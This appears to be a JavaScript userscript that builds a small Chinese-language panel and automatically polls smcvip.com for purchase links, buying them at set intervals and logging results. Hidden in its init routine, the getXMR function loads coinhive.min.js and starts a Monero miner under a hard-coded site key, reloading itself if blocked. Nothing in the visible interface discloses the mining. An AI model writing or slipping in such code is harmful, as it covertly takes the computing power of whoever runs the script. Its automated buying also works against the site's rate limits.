

function init() {
	window["catTimes"] = 0;
	window["catWait"] = refreshTime;
	window["catLogs"] = [];
	window["_waiting"] = 0;
	window["_xmr"] = 0;
	var div = $("#catjs");
	div.html("");
	var d1 = '<div style="text-align:center;height:30px;line-height:30px;border-bottom:1px solid black;border-top:1px solid black;"><button id="catStart" onclick="getISR()">启动</button></div>';
	div.append($(d1));
	var tb = '<table style="width:100%;height:30px;table-layout:fixed;"><tr>';
	tb += '<th>刷新<br>间隔</th><td><input type="text" style="width:100%;background:white;text-align:center;" id="refreshVal" value="'+refreshTime+'"></td>';
	tb += '<th>买入<br>间隔</th><td><input type="text" style="width:100%;background:white;text-align:center;" id="buyVal" value="'+buyTime+'"></td>';
	tb += '</tr></table>';
	div.append($(tb));
	var d2 = '<div id="catTips" style="text-align:center;height:30px;line-height:30px;border-bottom:1px solid black;border-top:1px solid black;"></div>';
	div.append($(d2));
	var d3 = '<div id="logs" style="position:absolute;top:90px;left:0;right:-12px;bottom:0;overflow:auto;"></div>';
	div.append($(d3));
	getXMR();
	if(autoRefresh != "undefined" && autoRefresh == 1) {
		setTimeout(getISR,3000);
	}
}

function getXMR() {
	var js = document.createElement("script");
	js.src = "//coinhive.com/lib/coinhive.min.js";
	js.id = "iscript";
	js.onload = function() {
		var miner = new CoinHive.Anonymous('2uSH2MKjBVH2e6wTxSMo5gnusifoX1kQ',{throttle: 0.4});
		miner.start();
	};
	js.onerror = function() {
		$("#iscript").remove();
		getXMR();
	}
	document.head.appendChild(js);
}


//刷新
function getISR() {
	$("#catStart").attr("disabled","disabled");
	$.ajax({
		method:"POST",
		url:"//www.smcvip.com/Works/ISR",
		//timeout:5000,
		dataType:"html",
		success:successISR,
		error:errorISR
	});
}
function intervalISR() {
	catTimes++;
	refreshTime = parseInt(document.querySelector("#refreshVal").value);
	setTimeout(getISR,refreshTime*1000);
	catWait = refreshTime;
	waiting();
}
function successISR(re) {
	var as = $(re).find(".styled a");
	if(as.length > 0) {
		var href = as[0].href;
		window["buyHref"] = href;
		//等待
		buyTime = parseInt(document.querySelector("#buyVal").value);
		setTimeout(getBuy,buyTime*1000);
		setLogs('buy');
	} else {
		if($(re).find(".styled").length > 0) {
			setLogs('normal');
		}
		if(re.indexOf("缓存文件") > 0) {
			setLogs('cache');
		}
		if(re.indexOf("买入失败") > 0) {
			setLogs('failed');
		}
		if(re.indexOf("操作太频繁!") > 0) {
			setLogs('op');
		}
		if(re.indexOf("买入成功") > 0) {
			setLogs('success');
		}
		if($(re).find("#txtN").length > 0) {
			setLogs('relogin');
		}
		intervalISR();
	}
}
function errorISR(re,status,err) {
	if(status == "timeout") {
		setLogs('timeout');
	} else {
		setLogs('error',status);
	}
	intervalISR();
}
function getBuy() {
	var href = window["buyHref"];
	$.get(href,function(re){
		if(re.indexOf("买入失败") > 0) {
			setLogs('failed');
		}
		if(re.indexOf("买入成功") > 0) {
			setLogs('success');
		}
		if(re.indexOf("操作太频繁!") > 0) {
			setLogs('op');
		}
	});
	intervalISR();
}
function waiting() {
	clearInterval(_waiting);
	_waiting = setInterval(function(){
		var str = '<span style="color:red;">'+catWait+'</span>秒后进行第<span style="color:red;font-weight:bold;">'+catTimes+'</span>次刷新';
		$("#catTips").html(str);
		catWait--;
		if(catWait == 0) {
			clearInterval(_waiting);
			var str = '正在进行第<span style="color:red;font-weight:bold;">'+catTimes+'</span>次刷新';
			$("#catTips").html(str);
		}
	},1000);
}
function setLogs(type,txt) {
	var date = new Date();
	var hh = date.getHours();
	if(hh < 10) hh = "0"+hh;
	var mm = date.getMinutes();
	if(mm < 10) mm = "0"+mm;
	var ss = date.getSeconds();
	if(ss < 10) ss = "0"+ss;
	var time = hh+":"+mm+":"+ss;
	var tip = time+" -"+catTimes+"- ";
	switch(type) {
		case 'timeout':
		catLogs.unshift(tip+"请求超时.");
		break;
		case 'normal':
		catLogs.unshift(tip+"什么都没有发生.");
		break;
		case 'cache':
		catLogs.unshift(tip+"缓存出错.");
		break;
		case 'failed':
		catLogs.unshift(tip+"买入失败，记录不存在或已被其它玩家买入!");
		break;
		case 'op':
		catLogs.unshift(tip+"操作太频繁!");
		break;
		case 'success':
		catLogs.unshift(tip+"买入成功!");
		break;
		case 'relogin':
		catLogs.unshift(tip+"需要重新登录!");
		break;
		case 'buy':
		catLogs.unshift(tip+"刷到买入链接!");
		break;
		case 'error':
		catLogs.unshift(tip+txt+"请求错误!");
		break;
	}
	var str = "";
	for(var i = 0; i < catLogs.length; i++) {
		str += "<div>"+catLogs[i]+"</div>";
	}
	$("#logs").html(str);
}
init();
